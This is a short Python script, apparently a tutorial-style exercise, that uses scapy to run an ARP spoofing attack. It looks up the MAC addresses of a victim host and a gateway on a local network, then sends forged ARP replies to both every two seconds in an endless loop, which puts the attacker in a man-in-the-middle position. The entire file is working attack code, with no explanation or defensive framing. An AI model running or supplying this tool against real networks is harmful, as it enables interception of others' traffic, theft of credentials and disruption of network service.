#!/usr/bin/env python 

from  scapy.all import *
import time 
import sys

def	get_mac(ip):
	arp_request_broadcast = (Ether(dst="ff:ff:ff:ff:ff:ff")/
		ARP(pdst=ip, hwlen=6, plen=4))
	answered = srp1(arp_request_broadcast, timeout=1, verbose=False)

	return answered[0].hwsrc 

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip,
		hwdst=target_mac, psrc=spoof_ip)
	sendp(packet)

def spoof_ipmac_ip(target_ip, target_mac, spoof_ip):
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip,
		hwdst=target_mac, psrc=spoof_ip)
	sendp(packet, verbose=False)
	

mac_victim = get_mac("192.168.0.134")
mac_route = get_mac("192.168.0.1")

sent_packets_count = 0
while True:
	spoof_ipmac_ip("192.168.0.134", mac_victim, "192.168.0.1")
	spoof_ipmac_ip("192.168.0.1", mac_route, "192.168.0.134")
	sent_packets_count = sent_packets_count + 2
	print("\r[+] Packets sent: " + str(sent_packets_count)),
	sys.stdout.flush()
	time.sleep(2)
